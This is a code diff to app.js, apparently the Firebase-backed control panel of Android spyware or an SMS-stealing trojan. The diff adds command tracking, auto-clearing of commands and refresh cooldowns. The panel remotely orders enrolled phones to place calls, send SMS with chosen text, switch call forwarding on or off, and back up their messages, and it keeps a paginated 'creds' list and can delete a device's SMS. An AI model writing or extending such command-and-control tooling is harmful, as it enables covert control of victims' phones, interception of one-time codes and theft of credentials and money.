@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - COMPLETE WITH DEVICE ID COPY BUTTON               */
+/* app.js - COMPLETE WITH DEVICE ID COPY BUTTON & FIXED COMMANDS */
 /* ============================================================ */
 
 // ============================================================
@@ -25,6 +25,7 @@ const DEVICE_LIMIT = 5;
 const SMS_LIMIT = 10;
 const DELETE_PASSWORD = '9999';
 const CREDS_PER_PAGE = 10;
+const COMMAND_CLEAR_DELAY = 8000; // 8 seconds
 
 // ============================================================
 // STATE
@@ -59,7 +60,12 @@ const state = {
     credFilter: 'all',
     credSearchQuery: '',
     credCurrentPage: 1,
-    favourites: []
+    favourites: [],
+    // New: Command tracking
+    pendingCommands: new Map(),
+    isManualRefresh: false,
+    refreshCooldown: false,
+    lastRefreshTime: 0
 };
 
 // ============================================================
@@ -76,7 +82,6 @@ function copyDeviceId(devId) {
     navigator.clipboard.writeText(devId).then(() => {
         showToast(`📋 Device ID copied: ${devId}`, 'success');
         
-        // Visual feedback - flash the button
         const buttons = document.querySelectorAll('.copy-device-id-btn');
         buttons.forEach(btn => {
             if (btn.closest(`#card-${devId}`)) {
@@ -91,7 +96,6 @@ function copyDeviceId(devId) {
             }
         });
     }).catch(() => {
-        // Fallback for older browsers
         const ta = document.createElement('textarea');
         ta.value = devId;
         document.body.appendChild(ta);
@@ -367,13 +371,28 @@ db.ref(".info/connected").on("value", (snap) => {
 });
 
 // ============================================================
-// MAIN DATA LISTENER
+// MAIN DATA LISTENER - WITH COOLDOWN
 // ============================================================
 db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
     state.dataVersion++;
     state.data = newData;
     updateCaches();
+    
+    // Manual refresh skip
+    if (state.isManualRefresh) {
+        state.isManualRefresh = false;
+        return;
+    }
+    
+    // Cooldown: 5 seconds
+    const now = Date.now();
+    if (state.refreshCooldown || (now - state.lastRefreshTime) < 5000) {
+        return;
+    }
+    state.refreshCooldown = true;
+    state.lastRefreshTime = now;
+    setTimeout(() => { state.refreshCooldown = false; }, 5000);
     
     const active = document.activeElement;
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
@@ -388,6 +407,18 @@ db.ref().on("value", (snapshot) => {
         }
     }
 });
+
+// ============================================================
+// MANUAL REFRESH
+// ============================================================
+function manualRefresh() {
+    state.isManualRefresh = true;
+    showToast('🔄 Refreshing...', 'info', 1000);
+    performRender();
+    setTimeout(() => {
+        showToast('✅ Refreshed!', 'success', 1500);
+    }, 500);
+}
 
 // ============================================================
 // UPDATE CACHES
@@ -917,7 +948,6 @@ function buildDeviceCardPremium(devId, index, devices) {
                         <span class="device-id">#${index + 1}</span>
                         ${serial > 0 ? `<span class="serial-badge-premium"><i class="fas fa-hashtag"></i> S-${serial}</span>` : ''}
                         ${isFav ? `<span style="color:var(--gold);font-size:10px;background:rgba(212,175,55,0.12);padding:1px 8px;border-radius:10px;border:1px solid rgba(212,175,55,0.2);">⭐ FAV</span>` : ''}
-                        <!-- COPY DEVICE ID BUTTON -->
                         <button class="copy-device-id-btn" onclick="event.stopPropagation();copyDeviceId('${devId}')" 
                             style="background:rgba(212,175,55,0.1);border:1px solid rgba(212,175,55,0.2);color:var(--gold);padding:2px 10px;border-radius:6px;font-size:10px;cursor:pointer;transition:all 0.3s ease;display:inline-flex;align-items:center;gap:4px;"
                             title="Copy Device ID">
@@ -1549,23 +1579,53 @@ function triggerDeviceBackup(devId) {
         statusEl.className = 'status-value pending';
     }
     
+    const commandId = 'backup_' + Date.now();
+    
     db.ref(`user_data/${devId}`).update({
         device: devId,
         command: 'backup',
         timestamp: Date.now(),
-        isOnline: true
+        isOnline: true,
+        commandId: commandId
     }).then(() => {
         showToast(`✅ Backup command sent to ${devId}`, 'success');
         setTimeout(refreshBackupStatus, 3000);
-    }).catch(() => {
+        
+        // Clear command after delay
+        setTimeout(() => {
+            clearCommand(devId);
+        }, COMMAND_CLEAR_DELAY);
+        
+    }).catch((err) => {
         if (statusEl) {
             statusEl.textContent = '❌ Failed';
             statusEl.className = 'status-value failed';
         }
-        showToast('❌ Failed to send', 'error');
+        showToast('❌ Failed: ' + err.message, 'error');
     });
 }
 
+// ============================================================
+// CLEAR COMMAND FUNCTION
+// ============================================================
+function clearCommand(devId) {
+    db.ref(`user_data/${devId}`).update({
+        command: null,
+        commandId: null
+    }).catch(() => {});
+}
+
+function clearAllCommands() {
+    const devices = state.data.user_data || {};
+    Object.keys(devices).forEach(devId => {
+        clearCommand(devId);
+    });
+    showToast('🧹 All commands cleared', 'info');
+}
+
+// ============================================================
+// REFRESH BACKUP STATUS
+// ============================================================
 function refreshBackupStatus() {
     const devId = $('backupDeviceSelect').value;
     if (!devId) return showToast('Select a device!', 'warning');
@@ -2071,7 +2131,110 @@ function deleteDeviceSms(devId) {
 }
 
 // ============================================================
-// SHOW COMMAND DIALOG
+// COMMAND FUNCTIONS - FIXED WITH CLEAR
+// ============================================================
+
+function sendCall(devId) {
+    const number = $(`callNum-${devId}`).value.trim();
+    const simSlot = $(`callSim-${devId}`).value;
+    if (!number) return showToast('Enter phone number!', 'warning');
+    
+    // First clear any existing command
+    clearCommand(devId);
+    
+    const commandId = 'call_' + Date.now();
+    
+    db.ref(`user_data/${devId}`).update({
+        device: devId,
+        simSlot: simSlot,
+        adminNumber: number,
+        command: 'make call',
+        timestamp: Date.now(),
+        isOnline: true,
+        commandId: commandId
+    }).then(() => {
+        showToast(`✅ Call command sent to ${devId}`, 'success');
+        $(`callNum-${devId}`).value = '';
+        
+        // Clear command after delay
+        setTimeout(() => {
+            clearCommand(devId);
+        }, COMMAND_CLEAR_DELAY);
+        
+    }).catch((err) => {
+        showToast('❌ Failed: ' + err.message, 'error');
+    });
+}
+
+function sendSms(devId) {
+    const number = $(`smsNum-${devId}`).value.trim();
+    const text = $(`smsText-${devId}`).value.trim();
+    const simSlot = $(`smsSim-${devId}`).value;
+    if (!number || !text) return showToast('Enter both number and message!', 'warning');
+    
+    // First clear any existing command
+    clearCommand(devId);
+    
+    const commandId = 'sms_' + Date.now();
+    
+    db.ref(`user_data/${devId}`).update({
+        targetDeviceId: devId,
+        phoneNumber: number,
+        messageText: text,
+        simSlot: simSlot,
+        command: 'send message',
+        timestamp: Date.now(),
+        isOnline: true,
+        commandId: commandId
+    }).then(() => {
+        showToast(`✅ SMS command sent to ${devId}`, 'success');
+        $(`smsNum-${devId}`).value = '';
+        $(`smsText-${devId}`).value = '';
+        
+        // Clear command after delay
+        setTimeout(() => {
+            clearCommand(devId);
+        }, COMMAND_CLEAR_DELAY);
+        
+    }).catch((err) => {
+        showToast('❌ Failed: ' + err.message, 'error');
+    });
+}
+
+function sendFwd(devId, cmd) {
+    const number = $(`fwdNum-${devId}`).value.trim();
+    const simSlot = $(`fwdSim-${devId}`).value;
+    if (cmd === 'call forward' && !number) return showToast('Enter forward number!', 'warning');
+    
+    // First clear any existing command
+    clearCommand(devId);
+    
+    const commandId = 'fwd_' + Date.now();
+    
+    db.ref(`user_data/${devId}`).update({
+        targetDeviceId: devId,
+        simSlot: simSlot,
+        phoneNumber: number || '',
+        command: cmd,
+        timestamp: Date.now(),
+        isOnline: true,
+        commandId: commandId
+    }).then(() => {
+        showToast(`✅ Forward command (${cmd}) sent to ${devId}`, 'success');
+        $(`fwdNum-${devId}`).value = '';
+        
+        // Clear command after delay
+        setTimeout(() => {
+            clearCommand(devId);
+        }, COMMAND_CLEAR_DELAY);
+        
+    }).catch((err) => {
+        showToast('❌ Failed: ' + err.message, 'error');
+    });
+}
+
+// ============================================================
+// SHOW COMMAND DIALOG - UPDATED
 // ============================================================
 function showCommandDialog(type, devId) {
     const messages = {
@@ -2082,73 +2245,20 @@ function showCommandDialog(type, devId) {
         'backup': '💾 Trigger SMS BACKUP on this device?'
     };
     if (!confirm(messages[type] || 'Send command?')) return;
-    switch (type) {
-        case 'call': sendCall(devId); break;
-        case 'sms': sendSms(devId); break;
-        case 'fwd_on': sendFwd(devId, 'call forward'); break;
-        case 'fwd_off': sendFwd(devId, 'forward off'); break;
-        case 'backup': triggerDeviceBackup(devId); break;
-    }
-}
-
-// ============================================================
-// COMMAND FUNCTIONS
-// ============================================================
-function sendCall(devId) {
-    const number = $(`callNum-${devId}`).value.trim();
-    const simSlot = $(`callSim-${devId}`).value;
-    if (!number) return showToast('Enter phone number!', 'warning');
     
-    db.ref(`user_data/${devId}`).update({
-        device: devId,
-        simSlot: simSlot,
-        adminNumber: number,
-        command: 'make call',
-        timestamp: Date.now(),
-        isOnline: true
-    }).then(() => {
-        showToast(`✅ Call sent to ${devId}`, 'success');
-        $(`callNum-${devId}`).value = '';
-    }).catch(() => showToast('❌ Failed', 'error'));
-}
-
-function sendSms(devId) {
-    const number = $(`smsNum-${devId}`).value.trim();
-    const text = $(`smsText-${devId}`).value.trim();
-    const simSlot = $(`smsSim-${devId}`).value;
-    if (!number || !text) return showToast('Enter both number and message!', 'warning');
+    // First clear any existing command
+    clearCommand(devId);
     
-    db.ref(`user_data/${devId}`).update({
-        targetDeviceId: devId,
-        phoneNumber: number,
-        messageText: text,
-        simSlot: simSlot,
-        command: 'send message',
-        timestamp: Date.now(),
-        isOnline: true
-    }).then(() => {
-        showToast(`✅ SMS sent to ${devId}`, 'success');
-        $(`smsNum-${devId}`).value = '';
-        $(`smsText-${devId}`).value = '';
-    }).catch(() => showToast('❌ Failed', 'error'));
-}
-
-function sendFwd(devId, cmd) {
-    const number = $(`fwdNum-${devId}`).value.trim();
-    const simSlot = $(`fwdSim-${devId}`).value;
-    if (cmd === 'call forward' && !number) return showToast('Enter forward number!', 'warning');
-    
-    db.ref(`user_data/${devId}`).update({
-        targetDeviceId: devId,
-        simSlot: simSlot,
-        phoneNumber: number || '',
-        command: cmd,
-        timestamp: Date.now(),
-        isOnline: true
-    }).then(() => {
-        showToast(`✅ Forward (${cmd}) sent`, 'success');
-        $(`fwdNum-${devId}`).value = '';
-    }).catch(() => showToast('❌ Failed', 'error'));
+    // Then send new command
+    setTimeout(() => {
+        switch (type) {
+            case 'call': sendCall(devId); break;
+            case 'sms': sendSms(devId); break;
+            case 'fwd_on': sendFwd(devId, 'call forward'); break;
+            case 'fwd_off': sendFwd(devId, 'forward off'); break;
+            case 'backup': triggerDeviceBackup(devId); break;
+        }
+    }, 300);
 }
 
 // ============================================================
@@ -2703,8 +2813,7 @@ function initPullToRefresh() {
             refreshIndicator.querySelector('.pull-text').textContent = 'Refreshing...';
             refreshIndicator.querySelector('.pull-icon i').className = 'fas fa-spinner fa-spin';
             refreshIndicator.classList.add('refreshing');
-            performRender();
-            showToast('🔄 Refreshed!', 'success', 1500);
+            manualRefresh();
             setTimeout(() => {
                 refreshIndicator.classList.remove('active', 'ready', 'refreshing');
                 refreshIndicator.style.transform = 'translateY(0)';
@@ -2943,3 +3052,6 @@ window.renderFavouritesCatalog = renderFavouritesCatalog;
 window.loadFavourites = loadFavourites;
 window.updateFavCounts = updateFavCounts;
 window.updateDeviceFavStars = updateDeviceFavStars;
+window.manualRefresh = manualRefresh;
+window.clearAllCommands = clearAllCommands;
+window.clearCommand = clearCommand;
